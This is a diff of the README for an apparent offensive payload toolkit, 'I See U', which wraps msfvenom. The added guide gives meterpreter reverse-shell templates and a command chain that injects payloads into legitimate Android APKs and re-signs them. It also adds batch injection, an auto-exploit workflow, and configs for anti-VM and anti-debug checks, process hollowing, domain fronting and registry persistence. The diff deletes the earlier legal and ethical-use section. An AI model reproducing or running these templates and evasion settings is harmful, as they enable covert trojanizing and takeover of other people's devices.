@@ -235,224 +235,723 @@ python3 iseeu-morden-gui.py
 # 3. Use custom templates for better evasion
 ./iseeu-toolkit.py --template custom_template.txt
 ```
+# 🔧 I See U Toolkit - Configuration & Usage Guide
+
+## 📁 Directory Structure
+
+After installation, your I See U Toolkit directory should look like this:
+
+```
+i-see-u/
+├── iseeu_toolkit.py          # Main CLI application
+├── iseeu-morden-gui.py       # Modern GUI interface
+├── iseeu-xp-version.py       # XP-style GUI interface
+├── requirements.txt          # Python dependencies
+├── requirements-dev.txt      # Development dependencies
+├── install.sh               # Automated installer
+├── README.md               # Main documentation
+├── LICENSE                 # MIT license
+├── configs/               # Configuration files
+│   ├── default.json       # Default settings
+│   ├── kali.json          # Kali Linux optimized
+│   ├── windows.json       # Windows/WSL settings
+│   ├── stealth.json       # High evasion settings
+│   └── android_targets.json # Android-specific configs
+├── payloads/              # Generated payloads output
+├── logs/                  # Application logs
+├── templates/             # Custom payload templates
+├── docs/                  # Documentation
+└── tests/                 # Unit tests (dev)
+```
 
 ---
 
-## ⚙️ **Configuration**
+## ⚙️ Configuration Files
 
-### 🔧 **Environment Setup**
-```bash
-# Set default LHOST (your IP)
-export ISEEU_LHOST="192.168.1.100"
+### 🎛️ **Default Configuration (configs/default.json)**
 
-# Set default LPORT
-export ISEEU_LPORT="4444"
-
-# Set Android SDK path (if custom)
-export ANDROID_HOME="$HOME/android-sdk"
-```
-
-### 📁 **Configuration Files**
-```bash
-configs/
-├── default.json          # Default configuration
-├── kali.json             # Kali Linux optimized
-├── windows.json          # Windows/WSL settings  
-├── stealth.json          # High evasion settings
-└── android_targets.json  # Android-specific configs
-```
-
-### 🎛️ **Custom Configuration Example**
 ```json
 {
-  "lhost": "192.168.1.100",
-  "lport": 4444,
-  "encoder": "x86/shikata_ga_nai",
-  "iterations": 3,
-  "format": "exe",
-  "platform": "windows",
-  "android_target": 11,
-  "stealth_mode": true,
-  "auto_listener": true
+  "network": {
+    "lhost": "127.0.0.1",
+    "lport": 4444,
+    "auto_detect_ip": true,
+    "preferred_interface": "eth0"
+  },
+  "payloads": {
+    "encoder": "x86/shikata_ga_nai",
+    "iterations": 3,
+    "format": "exe",
+    "platform": "windows",
+    "architecture": "x64",
+    "bad_chars": "\\x00\\x0a\\x0d"
+  },
+  "android": {
+    "target_version": 11,
+    "use_original_cert": false,
+    "zipalign": true,
+    "sign_apk": true
+  },
+  "output": {
+    "directory": "./payloads",
+    "filename_prefix": "iseeu_",
+    "timestamp_suffix": true
+  },
+  "metasploit": {
+    "auto_listener": true,
+    "handler": "exploit/multi/handler",
+    "workspace": "iseeu_default"
+  },
+  "gui": {
+    "theme": "dark",
+    "auto_save_config": true,
+    "show_advanced_options": false
+  },
+  "logging": {
+    "level": "INFO",
+    "file": "./logs/iseeu.log",
+    "max_size": "10MB",
+    "backup_count": 5
+  },
+  "security": {
+    "stealth_mode": false,
+    "randomize_payload": true,
+    "custom_templates": true
+  }
+}
+```
+
+### 🔥 **Kali Linux Optimized (configs/kali.json)**
+
+```json
+{
+  "network": {
+    "lhost": "auto",
+    "lport": 4444,
+    "auto_detect_ip": true,
+    "preferred_interface": "eth0"
+  },
+  "payloads": {
+    "encoder": "x64/xor_dynamic",
+    "iterations": 5,
+    "format": "elf",
+    "platform": "linux",
+    "architecture": "x64"
+  },
+  "android": {
+    "target_version": 10,
+    "use_original_cert": true,
+    "zipalign": true,
+    "sign_apk": true
+  },
+  "metasploit": {
+    "auto_listener": true,
+    "handler": "exploit/multi/handler",
+    "workspace": "kali_pentest",
+    "database": true
+  },
+  "logging": {
+    "level": "DEBUG",
+    "file": "./logs/kali_debug.log"
+  },
+  "security": {
+    "stealth_mode": true,
+    "randomize_payload": true,
+    "custom_templates": true,
+    "evasion_techniques": ["polymorphic", "encryption"]
+  }
+}
+```
+
+### 🥷 **Stealth Configuration (configs/stealth.json)**
+
+```json
+{
+  "payloads": {
+    "encoder": "x86/countdown",
+    "iterations": 10,
+    "custom_encoder": true,
+    "polymorphic": true
+  },
+  "android": {
+    "target_version": 10,
+    "inject_method": "smali",
+    "permission_minimal": true,
+    "obfuscate_manifest": true
+  },
+  "evasion": {
+    "anti_vm": true,
+    "anti_debug": true,
+    "sleep_timer": 30,
+    "process_injection": true
+  },
+  "network": {
+    "domain_fronting": false,
+    "https_only": true,
+    "user_agent_spoofing": true
+  },
+  "security": {
+    "stealth_mode": true,
+    "randomize_payload": true,
+    "encrypt_strings": true,
+    "strip_debug_info": true
+  }
 }
 ```
 
 ---
 
-## 🚨 **Troubleshooting**
+## 🚀 Usage Examples
 
-### ❌ **Common Issues & Solutions**
+### 🖥️ **CLI Version Usage**
 
-#### **APKTool Not Found**
+#### **Basic Payload Generation**
 ```bash
-# Solution 1: Install via package manager
-sudo apt install apktool
+# Windows reverse shell
+python3 iseeu_toolkit.py --platform windows --lhost 192.168.1.100 --lport 4444
 
-# Solution 2: Manual installation
-wget https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool
-wget https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.7.0.jar
-sudo cp apktool_2.7.0.jar /usr/local/bin/apktool.jar
-sudo cp apktool /usr/local/bin/
-sudo chmod +x /usr/local/bin/apktool
+# Linux payload with custom encoder
+python3 iseeu_toolkit.py --platform linux --encoder x64/xor --iterations 5
+
+# Android APK with custom port
+python3 iseeu_toolkit.py --platform android --lport 8080 --output myapp.apk
 ```
+
+#### **APK Injection**
+```bash
+# Inject payload into legitimate APK
+python3 iseeu_toolkit.py --inject --original-apk /path/to/app.apk --lhost 192.168.1.100
+
+# Batch inject multiple APKs
+python3 iseeu_toolkit.py --batch-inject --apk-directory /path/to/apks/
+```
+
+#### **Advanced Options**
+```bash
+# Use custom configuration
+python3 iseeu_toolkit.py --config configs/stealth.json
+
+# Generate multiple formats
+python3 iseeu_toolkit.py --multi-format --formats exe,elf,apk
+
+# Auto-start listener
+python3 iseeu_toolkit.py --auto-listener --workspace pentest_2024
+```
+
+### 🎨 **Modern GUI Usage**
+
+#### **Launch Modern GUI**
+```bash
+# Standard launch
+python3 iseeu-morden-gui.py
+
+# With specific theme
+python3 iseeu-morden-gui.py --theme dark
+
+# With custom config
+python3 iseeu-morden-gui.py --config configs/kali.json
+```
+
+#### **GUI Features**
+- **Real-time Progress**: Live updates during payload generation
+- **Drag & Drop**: Drop APK files for instant injection
+- **Batch Processing**: Queue multiple payloads
+- **Integrated Terminal**: Built-in terminal for Metasploit
+- **Theme Support**: Dark/Light/Auto themes
+- **Configuration Manager**: Save and load presets
+
+### 🔄 **XP-Style GUI Usage**
+
+#### **Launch XP GUI**
+```bash
+# Basic launch
+python3 iseeu-xp-version.py
+
+# With retro theme
+python3 iseeu-xp-version.py --theme xp-classic
+```
+
+#### **XP GUI Features**
+- **Windows XP Aesthetics**: Nostalgic interface design
+- **Simple Workflow**: One-click operations
+- **Minimal Resource Usage**: Lightweight interface
+- **Quick Access**: Fast payload generation
+
+---
+
+## 🌐 Environment Variables
+
+### **Core Variables**
+```bash
+# Installation directory
+export ISEEU_HOME="/home/user/i-see-u"
+
+# Default network settings
+export ISEEU_LHOST="192.168.1.100"
+export ISEEU_LPORT="4444"
+
+# Android SDK path (if custom)
+export ANDROID_HOME="/opt/android-sdk"
+export ANDROID_SDK_ROOT="/opt/android-sdk"
+
+# Java settings
+export JAVA_HOME="/usr/lib/jvm/java-11-openjdk-amd64"
+
+# Metasploit database
+export MSF_DATABASE_CONFIG="/usr/share/metasploit-framework/config/database.yml"
+```
+
+### **Advanced Variables**
+```bash
+# Logging level
+export ISEEU_LOG_LEVEL="DEBUG"
+
+# Custom templates directory
+export ISEEU_TEMPLATES="/path/to/custom/templates"
+
+# Proxy settings
+export ISEEU_PROXY="http://proxy.example.com:8080"
+
+# GUI theme preference
+export ISEEU_THEME="dark"
+```
+
+---
+
+## 🎯 Platform-Specific Configuration
+
+### 🐧 **Linux Configuration**
+
+#### **Kali Linux**
+```bash
+# Optimal settings for Kali
+cp configs/kali.json configs/current.json
+
+# Network interface detection
+ip route | grep default | awk '{print $5}' > ~/.iseeu_interface
+
+# Metasploit optimization
+echo "db_connect -y /usr/share/metasploit-framework/config/database.yml" > ~/.msf4/msfconsole.rc
+```
+
+#### **Ubuntu/Debian**
+```bash
+# Install additional tools
+sudo apt install -y sqlmap nikto dirb gobuster
+
+# Set up aliases
+echo "alias msfconsole='msfconsole -q'" >> ~/.bashrc
+echo "alias iseeu-quick='python3 $ISEEU_HOME/iseeu_toolkit.py --config configs/default.json'" >> ~/.bashrc
+```
+
+### 🪟 **Windows/WSL Configuration**
+
+#### **WSL Setup**
+```bash
+# Enable systemd (for WSL2)
+echo '[boot]
+systemd=true' | sudo tee -a /etc/wsl.conf
+
+# Windows-specific network configuration
+export ISEEU_LHOST=$(ip route show | grep -i default | awk '{ print $3}')
+
+# X11 forwarding for GUI (if using VcXsrv)
+export DISPLAY=$(cat /etc/resolv.conf | grep nameserver | awk '{print $2}'):0.0
+export LIBGL_ALWAYS_INDIRECT=1
+```
+
+#### **Windows Native (Limited Support)**
+```powershell
+# PowerShell configuration
+$env:ISEEU_HOME = "C:\tools\i-see-u"
+$env:JAVA_HOME = "C:\Program Files\Java\jdk-11"
+$env:ANDROID_HOME = "C:\Android\SDK"
+
+# Add to PATH
+$env:PATH += ";$env:ISEEU_HOME;$env:JAVA_HOME\bin;$env:ANDROID_HOME\tools"
+```
+
+### 🍎 **macOS Configuration**
+
+```bash
+# Homebrew paths
+export JAVA_HOME=$(/usr/libexec/java_home -v 11)
+export ANDROID_HOME="/usr/local/share/android-sdk"
+
+# Network interface (usually en0)
+export ISEEU_INTERFACE="en0"
+
+# GUI support
+export ISEEU_GUI_BACKEND="tkinter"
+```
+
+---
+
+## 🔧 Advanced Configuration
+
+### 🎭 **Custom Payload Templates**
+
+#### **Create Custom Template (templates/custom_windows.txt)**
+```bash
+# Windows reverse shell with custom evasion
+msfvenom -p windows/x64/meterpreter/reverse_tcp \
+LHOST={{LHOST}} LPORT={{LPORT}} \
+-e x64/xor_dynamic -i {{ITERATIONS}} \
+-f exe -o {{OUTPUT}} \
+--platform windows --arch x64 \
+-b "{{BAD_CHARS}}" \
+-k \
+--smallest
+```
+
+#### **Android Injection Template (templates/android_stealth.txt)**
+```bash
+# Android payload with advanced evasion
+msfvenom -p android/meterpreter/reverse_tcp \
+LHOST={{LHOST}} LPORT={{LPORT}} \
+-o {{TEMP_APK}} && \
+apktool d {{ORIGINAL_APK}} -o {{TEMP_DIR}} && \
+apktool d {{TEMP_APK}} -o {{PAYLOAD_DIR}} && \
+# Custom smali injection logic here
+{{CUSTOM_INJECTION_SCRIPT}} && \
+apktool b {{TEMP_DIR}} -o {{OUTPUT}} && \
+jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 \
+-keystore {{KEYSTORE}} {{OUTPUT}} {{KEY_ALIAS}} && \
+zipalign -v 4 {{OUTPUT}} {{FINAL_OUTPUT}}
+```
+
+### 🔒 **Security Configurations**
+
+#### **High Security Mode**
+```json
+{
+  "security": {
+    "stealth_mode": true,
+    "encryption": {
+      "enabled": true,
+      "algorithm": "AES-256-GCM",
+      "key_derivation": "PBKDF2"
+    },
+    "obfuscation": {
+      "string_encryption": true,
+      "control_flow": true,
+      "dead_code_insertion": true
+    },
+    "anti_analysis": {
+      "anti_vm": true,
+      "anti_debug": true,
+      "anti_sandbox": true,
+      "packer": "upx"
+    }
+  }
+}
+```
+
+#### **Evasion Techniques**
+```json
+{
+  "evasion": {
+    "techniques": [
+      "domain_fronting",
+      "dns_tunneling", 
+      "process_hollowing",
+      "dll_sideloading"
+    ],
+    "timing": {
+      "sleep_before_execution": 60,
+      "random_delays": true,
+      "execution_window": "business_hours"
+    },
+    "persistence": {
+      "registry_keys": true,
+      "scheduled_tasks": true,
+      "startup_folders": false
+    }
+  }
+}
+```
+
+### 📱 **Android-Specific Advanced Config**
+
+```json
+{
+  "android_advanced": {
+    "target_versions": [10, 11, 12, 13, 14],
+    "injection_methods": {
+      "smali": {
+        "enabled": true,
+        "hook_points": ["onCreate", "onResume", "onStart"]
+      },
+      "native": {
+        "enabled": false,
+        "library_name": "libcustom.so"
+      }
+    },
+    "manifest_modifications": {
+      "permissions": {
+        "add_minimal": true,
+        "remove_suspicious": true,
+        "custom_permissions": []
+      },
+      "activities": {
+        "hide_launcher_icon": false,
+        "background_execution": true
+      }
+    },
+    "signing": {
+      "custom_keystore": "./keys/custom.keystore",
+      "key_alias": "custom_key",
+      "key_password": "changeme",
+      "store_password": "changeme"
+    },
+    "optimization": {
+      "zipalign": true,
+      "proguard": false,
+      "resource_shrinking": true
+    }
+  }
+}
+```
+
+---
+
+## 🐛 Troubleshooting & Debug Mode
+
+### 🔍 **Enable Debug Mode**
+```bash
+# CLI debug mode
+python3 iseeu_toolkit.py --debug --verbose
+
+# GUI debug mode
+python3 iseeu-morden-gui.py --debug
+
+# Environment debug
+export ISEEU_LOG_LEVEL="DEBUG"
+export ISEEU_VERBOSE="true"
+```
+
+### 📊 **System Diagnostics**
+```bash
+# Check system compatibility
+python3 iseeu_toolkit.py --system-check
+
+# Verify dependencies
+python3 iseeu_toolkit.py --check-deps
+
+# Network diagnostics
+python3 iseeu_toolkit.py --network-test
+
+# Generate diagnostic report
+python3 iseeu_toolkit.py --diagnostic-report > iseeu_diagnostics.txt
+```
+
+### 🔧 **Common Fixes**
 
 #### **Java Issues**
 ```bash
-# Check Java installation
-java -version
-javac -version
+# Fix Java path
+sudo update-alternatives --config java
+export JAVA_HOME=$(readlink -f /usr/bin/javac | sed "s:/bin/javac::")
 
-# Set JAVA_HOME if needed
-export JAVA_HOME=/usr/lib/jvm/java-11-openjdk-amd64
-echo 'export JAVA_HOME=/usr/lib/jvm/java-11-openjdk-amd64' >> ~/.bashrc
+# Verify Java tools
+keytool -help
+jarsigner -help
 ```
 
-#### **Metasploit Not Starting**
+#### **APKTool Problems**
 ```bash
-# Initialize Metasploit database
+# Reinstall apktool
+sudo apt remove apktool
+wget https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool
+wget https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.7.0.jar
+sudo cp apktool.jar /usr/local/bin/
+sudo cp apktool /usr/local/bin/
+sudo chmod +x /usr/local/bin/apktool
+
+# Test apktool
+apktool --version
+```
+
+#### **Metasploit Database Issues**
+```bash
+# Reset Metasploit database
+sudo msfdb delete
 sudo msfdb init
 
-# Start PostgreSQL (if needed)
+# Manual database setup
 sudo systemctl start postgresql
 sudo systemctl enable postgresql
-
-# Update Metasploit
-msfupdate
+sudo msfdb init
 ```
 
-#### **GUI Not Launching**
+#### **GUI Issues**
 ```bash
 # Install GUI dependencies
-sudo apt install python3-tk
+sudo apt install python3-tk python3-pil python3-pil.imagetk
 
-# For WSL, install VcXsrv or similar X server
-# For headless systems, use CLI version
-```
+# For WSL with GUI
+sudo apt install xorg
+export DISPLAY=$(cat /etc/resolv.conf | grep nameserver | awk '{print $2}'):0.0
 
-### 🔍 **Debug Mode**
-```bash
-# Enable verbose logging
-python3 iseeu-toolkit.py --debug
-
-# Check system compatibility
-python3 iseeu-toolkit.py --check-deps
-
-# Generate compatibility report
-python3 iseeu-toolkit.py --system-info
+# Test GUI
+python3 -c "import tkinter; tkinter.Tk().mainloop()"
 ```
 
 ---
 
-## 🔐 **Security & Legal Notice**
+## 📈 Performance Optimization
 
-### ⚖️ **Legal Disclaimer**
-```
-⚠️  IMPORTANT LEGAL NOTICE:
-
-This tool is designed for authorized penetration testing, 
-security research, and educational purposes ONLY.
-
-✅ Authorized Use:
-- Penetration testing with written permission
-- Security research in controlled environments  
-- Educational and learning purposes
-- Testing your own systems and applications
-
-❌ Unauthorized Use (STRICTLY PROHIBITED):
-- Attacking systems without explicit permission
-- Malicious activities of any kind
-- Illegal access to computer systems
-- Distribution of malware
-
-Users are fully responsible for compliance with all 
-applicable local, state, and federal laws.
+### ⚡ **Speed Optimizations**
+```json
+{
+  "performance": {
+    "multi_threading": {
+      "enabled": true,
+      "max_workers": 4
+    },
+    "caching": {
+      "payload_cache": true,
+      "template_cache": true,
+      "config_cache": true
+    },
+    "compilation": {
+      "precompile_templates": true,
+      "optimize_bytecode": true
+    }
+  }
+}
 ```
 
-### 🛡️ **Ethical Usage Guidelines**
-- Always obtain written authorization before testing
-- Respect scope limitations and rules of engagement
-- Report vulnerabilities responsibly
-- Do not cause harm or disruption to systems
-- Follow responsible disclosure practices
+### 💾 **Memory Management**
+```json
+{
+  "memory": {
+    "max_payload_size": "100MB",
+    "cache_limit": "500MB",
+    "gc_threshold": 0.8,
+    "streaming_mode": true
+  }
+}
+```
 
 ---
 
-## 🤝 **Contributing**
+## 🚀 Automation & Scripting
 
-We welcome contributions! Here's how to get started:
-
-### 📝 **Development Setup**
+### 🤖 **Batch Operations**
 ```bash
-# Fork the repository
-git clone https://github.com/your-username/i-see-u.git
-cd i-see-u
+# Batch payload generation
+python3 iseeu_toolkit.py --batch \
+  --targets targets.txt \
+  --config configs/stealth.json \
+  --output-dir ./batch_payloads/
 
-# Create development environment
-python3 -m venv venv
-source venv/bin/activate
-pip install -r requirements-dev.txt
-
-# Create feature branch
-git checkout -b feature/amazing-feature
+# Automated testing workflow
+python3 iseeu_toolkit.py --workflow pentest \
+  --target 192.168.1.0/24 \
+  --ports 80,443,8080 \
+  --auto-exploit
 ```
 
-### 🔄 **Contribution Workflow**
-1. Fork the Project
-2. Create Feature Branch (`git checkout -b feature/AmazingFeature`)
-3. Commit Changes (`git commit -m 'Add AmazingFeature'`)
-4. Push to Branch (`git push origin feature/AmazingFeature`)
-5. Open Pull Request
+### 📋 **Configuration Management**
+```bash
+# Save current configuration
+python3 iseeu_toolkit.py --save-config my_pentest.json
 
-### 🐛 **Bug Reports**
-Please include:
+# Load and merge configurations  
+python3 iseeu_toolkit.py --config base.json --merge additional.json
+
+# Validate configuration
+python3 iseeu_toolkit.py --validate-config my_config.json
+```
+
+---
+
+## 📚 Integration Examples
+
+### 🔗 **With Other Tools**
+
+#### **Metasploit Integration**
+```bash
+# Auto-generate and load payload
+python3 iseeu_toolkit.py --msf-integration \
+  --workspace pentest_client \
+  --auto-handler \
+  --persistence
+
+# Export to Metasploit resource script
+python3 iseeu_toolkit.py --export-msf-rc output.rc
+```
+
+#### **Covenant Integration**
+```bash
+# Generate Covenant-compatible payloads
+python3 iseeu_toolkit.py --covenant \
+  --listener-profile default \
+  --grunt-template custom
+```
+
+#### **Empire Integration**  
+```bash
+# Empire stager generation
+python3 iseeu_toolkit.py --empire \
+  --stager multi/launcher \
+  --listener http
+```
+
+---
+
+## 🔐 Security Best Practices
+
+### 🛡️ **Operational Security**
+1. **Never use on unauthorized systems**
+2. **Rotate LHOST/LPORT regularly** 
+3. **Use VPNs for remote testing**
+4. **Clean up artifacts after testing**
+5. **Document all activities**
+
+### 📝 **Configuration Security**
+```json
+{
+  "security_practices": {
+    "config_encryption": true,
+    "credential_management": "external_vault",
+    "audit_logging": true,
+    "access_controls": {
+      "require_sudo": false,
+      "user_whitelist": ["pentester", "security"]
+    }
+  }
+}
+```
+
+---
+
+## 🆘 Getting Help
+
+### 📞 **Support Channels**
+- 🐛 **Bug Reports**: [GitHub Issues](https://github.com/kishwordulal1234/i-see-u/issues)
+- 💬 **Discussions**: [GitHub Discussions](https://github.com/kishwordulal1234/i-see-u/discussions)  
+- 📖 **Documentation**: [Wiki](https://github.com/kishwordulal1234/i-see-u/wiki)
+- 🔒 **Security Issues**: security@iseeu-toolkit.com
+
+### 📋 **When Reporting Issues**
+Include:
 - Operating system and version
-- Python version
+- Python version (`python3 --version`)
 - Full error message and stack trace
+- Configuration file being used
 - Steps to reproduce
 - Expected vs actual behavior
 
 ---
 
-## 📚 **Documentation**
-
-- **[Quick Start Guide](docs/quickstart.md)** - Get up and running in 5 minutes
-- **[Advanced Usage](docs/advanced.md)** - Power user features
-- **[API Reference](docs/api.md)** - For developers
-- **[Troubleshooting](docs/troubleshooting.md)** - Common issues and solutions
-- **[Contributing Guide](docs/contributing.md)** - How to contribute
-
----
-
-## 🏆 **Acknowledgments**
-
-- **Original mahadev_v1** by [@kishwordulal1234](https://github.com/kishwordulal1234)
-- **Metasploit Framework** by [Rapid7](https://github.com/rapid7/metasploit-framework)
-- **Android Reverse Engineering Tools** - apktool, zipalign, aapt
-- **Security Research Community** - For continuous feedback and improvements
-
----
-
-## 📄 **License**
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
----
-
-## 📞 **Support**
-
-- 🐛 **Bug Reports**: [GitHub Issues](https://github.com/kishwordulal1234/i-see-u/issues)
-- 💬 **Discussions**: [GitHub Discussions](https://github.com/kishwordulal1234/i-see-u/discussions)
-- 📧 **Security Issues**: security@iseeu-toolkit.com
-- 📖 **Documentation**: [Wiki](https://github.com/kishwordulal1234/i-see-u/wiki)
-
----
-
 <div align="center">
 
-**⭐ Star this repo if you found it helpful!**
+**🎯 Happy Ethical Hacking!**
 
-Made with ❤️ by ethical hackers, for ethical hackers.
-
-*Remember: With great power comes great responsibility.*
+*Remember: Always test responsibly and within legal boundaries.*
 
 </div>
+---
+
